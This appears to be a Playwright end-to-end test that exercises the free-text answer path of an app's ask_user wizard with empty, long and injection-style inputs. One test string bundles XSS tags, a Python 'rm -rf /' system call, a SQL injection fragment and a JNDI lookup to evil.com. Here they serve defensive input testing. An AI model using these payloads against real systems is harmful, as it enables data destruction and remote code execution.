// Iter 9: probe the 其他... free-text path in ask_user cards.
// Edge cases: empty submit, long text (10k), HTML/script injection.
import { chromium } from "playwright";
import { mkdirSync, writeFileSync, appendFileSync } from "node:fs";
import { fileURLToPath } from "node:url";
import { dirname, join } from "node:path";

const BASE = "http://127.0.0.1:3000";
const RUNTIME = "http://127.0.0.1:2024";
const stamp = new Date().toISOString().replace(/[:.]/g, "-");
const outDir = join(dirname(fileURLToPath(import.meta.url)), "out");
mkdirSync(outDir, { recursive: true });
const runDir = join(outDir, `iter9-other-path-${stamp}`);
mkdirSync(runDir, { recursive: true });

const wsPath = `/tmp/e2e_iter9_${Date.now()}`;
mkdirSync(wsPath, { recursive: true });

const events = [];
function log(m) { const l = `[${new Date().toISOString()}] ${m}`; console.log(l); appendFileSync(join(runDir, "run.log"), l + "\n"); }
function evt(t, d) { events.push({ t: new Date().toISOString(), type: t, ...d }); }

const browser = await chromium.launch();
const context = await browser.newContext({ viewport: { width: 1440, height: 900 } });
const page = await context.newPage();
page.on("dialog", async (d) => { if (d.type() === "prompt") await d.accept(wsPath); else await d.accept(); });
page.on("console", (m) => evt("console", { level: m.type(), text: m.text().slice(0, 500) }));
page.on("pageerror", (e) => evt("pageerror", { message: e.message, stack: (e.stack || "").slice(0, 400) }));
page.on("response", (r) => { if (r.status() >= 400) evt("badResp", { url: r.url(), status: r.status() }); });

let shotIdx = 0;
async function shot(name) {
  shotIdx += 1;
  await page.screenshot({ path: join(runDir, `${String(shotIdx).padStart(2, "0")}-${name}.png`), fullPage: false });
  log(`📸 ${String(shotIdx).padStart(2, "0")}-${name}`);
}

async function findAsk() {
  return await page.evaluate(() => {
    const dialogs = Array.from(document.querySelectorAll("[role='dialog']"));
    for (const d of dialogs.reverse()) {
      const q = d.querySelector("[id='ask-user-question']")?.textContent?.trim();
      if (!q) continue;
      return { question: q, hasDialog: true };
    }
    return null;
  });
}
async function waitForNewQuestion(prev, timeoutMs = 90000) {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    await page.waitForTimeout(500);
    const n = await findAsk();
    if (!n) return "gone";
    if (n.question !== prev) return n.question;
  }
  return null;
}

log(`🚀 create workspace`);
await page.goto(BASE, { waitUntil: "domcontentloaded" });
await page.waitForSelector("body[data-internagents-startup='ready']", { timeout: 20000 }).catch(() => {});
await page.waitForTimeout(1000);
await page.getByRole("button", { name: "New project", exact: true }).click();
await page.waitForURL(/workspaceId=/, { timeout: 20000 });
await page.locator("textarea").first().waitFor({ state: "visible", timeout: 15000 });
await page.waitForTimeout(2500);
await shot("wizard-loaded");
const workspaceId = new URL(page.url()).searchParams.get("workspaceId");

// Wait for first ask_user
let ask = null;
for (let i = 0; i < 60; i++) {
  ask = await findAsk();
  if (ask) break;
  await page.waitForTimeout(500);
}
if (!ask) { log(`❌ no ask_user shown`); await browser.close(); process.exit(2); }
log(`Q1: ${ask.question}`);

// Helper: click 其他, submit text via 提交
async function submitOther(text, tag) {
  log(`\n=== ${tag} (${text.length} chars): ${JSON.stringify(text.slice(0, 60))} ===`);
  const q0 = (await findAsk())?.question;

  // Click 其他 button
  const otherClicked = await page.evaluate(() => {
    const btns = Array.from(document.querySelectorAll("[role='dialog'] button"));
    const other = btns.find((b) => /^其他/.test((b.textContent || "").trim()));
    if (other) { other.click(); return true; }
    return false;
  });
  if (!otherClicked) { log(`❌ 其他 button not found`); return { failed: "no-other-btn" }; }
  await page.waitForTimeout(400);
  await shot(`${tag}-other-opened`);

  // Now the dialog has a textarea + 提交 button. Find them.
  const tas = await page.locator("[role='dialog'] textarea").all();
  if (tas.length === 0) { log(`❌ textarea inside dialog not found`); return { failed: "no-textarea" }; }
  const dta = tas[0];
  await dta.fill(text);
  await page.waitForTimeout(200);
  await shot(`${tag}-filled`);

  // Check if 提交 button is disabled
  const submitState = await page.evaluate(() => {
    const btns = Array.from(document.querySelectorAll("[role='dialog'] button"));
    const submit = btns.find((b) => /^提交/.test((b.textContent || "").trim()));
    return submit ? { present: true, disabled: submit.disabled } : { present: false };
  });
  log(`submit button: ${JSON.stringify(submitState)}`);
  if (submitState.disabled) {
    log(`⏸ submit disabled — text considered invalid. Click 取消 to reset panel.`);
    await page.evaluate(() => {
      const cancel = Array.from(document.querySelectorAll("[role='dialog'] button")).find((b) => /^取消/.test((b.textContent || "").trim()));
      cancel?.click();
    });
    await page.waitForTimeout(400);
    await shot(`${tag}-cancelled`);
    return { submitDisabled: true, textLength: text.length };
  }

  // Click 提交
  await page.evaluate(() => {
    const submit = Array.from(document.querySelectorAll("[role='dialog'] button")).find((b) => /^提交/.test((b.textContent || "").trim()));
    submit?.click();
  });
  log(`📤 submit clicked`);
  await page.waitForTimeout(500);
  await shot(`${tag}-just-submitted`);

  // Wait for question to change or dialog to disappear
  const outcome = await waitForNewQuestion(q0, 120000);
  log(`outcome: ${outcome === null ? "no-advance-in-120s" : outcome === "gone" ? "dialog-disappeared" : "new-question=" + outcome.slice(0, 40)}`);
  await shot(`${tag}-after-advance`);

  // If still on same question (submit didn't advance), or dialog is gone (bad), stop.
  // Otherwise good — new dialog is now visible with 其他 button available for next round.
  return { submitted: true, outcome, textLength: text.length };
}

const results = {};

// A) empty text — should be blocked
results.empty = await submitOther("", "A-empty");

// B) short valid text — should advance
results.short = await submitOther("我做卫星热控设计，主要跟航天器热平衡和相变材料打交道。", "B-short");

// C) very long text
// Wait for wizard to render next dialog first
for (let i = 0; i < 60; i++) {
  const a = await findAsk();
  if (a && !a.question.includes("希望天玄")) break;
  await page.waitForTimeout(500);
}
const longText = "背景：" + "长文本压力测试内容。".repeat(500);
results.long = await submitOther(longText, "C-long");

// D) injection-style content
for (let i = 0; i < 60; i++) {
  const a = await findAsk();
  if (a && !a.question.match(/领域|方向/)) break;
  await page.waitForTimeout(500);
}
const injection = "<script>alert('XSS')</script><img src=x onerror=alert(1)>\n```py\nimport os; os.system('rm -rf /')\n```\n' OR 1=1;-- <b>bold</b> ${jndi:ldap://evil.com/a}";
results.injection = await submitOther(injection, "D-injection");

// Final backend state
const threadsR = await fetch(`${RUNTIME}/threads/search`, {
  method: "POST", headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ limit: 1, metadata: { internagents_workspace_id: workspaceId } }),
});
const [thread] = await threadsR.json();
const stateR = await fetch(`${RUNTIME}/threads/${thread.thread_id}/state`);
const state = await stateR.json();
const messages = state?.values?.messages ?? [];
const humanMsgs = messages.filter((m) => m.type === "human").map((m) => (typeof m.content === "string" ? m.content : "").slice(0, 100));
log(`\nfinal backend: ${messages.length} messages, ${humanMsgs.length} human`);
log(`human contents (first 100 chars each):\n${humanMsgs.map((c, i) => `  [${i}] ${c}`).join("\n")}`);

// Check: does the raw injection string appear verbatim in stored messages?
const injectionSubstr = "<script>alert('XSS')</script>";
const injectionStored = messages.some((m) => typeof m.content === "string" && m.content.includes(injectionSubstr));
log(`\ninjection payload stored verbatim: ${injectionStored}`);

// Check the DOM for any XSS execution
const alertsFired = events.filter((e) => e.type === "pageerror" || (e.type === "console" && e.level === "error"));
log(`\npage errors + console errors during run: ${alertsFired.length}`);
for (const a of alertsFired) log(`  ${a.type}: ${(a.message || a.text || "").slice(0, 200)}`);

writeFileSync(join(runDir, "summary.json"), JSON.stringify({
  workspaceId, results, backend: { messageCount: messages.length, humanCount: humanMsgs.length, injectionStored },
  counts: {
    consoleErrors: events.filter((e) => e.type === "console" && e.level === "error").length,
    pageErrors: events.filter((e) => e.type === "pageerror").length,
    badResponses: events.filter((e) => e.type === "badResp").length,
  },
}, null, 2));

log(`\nout: ${runDir}`);
await browser.close();
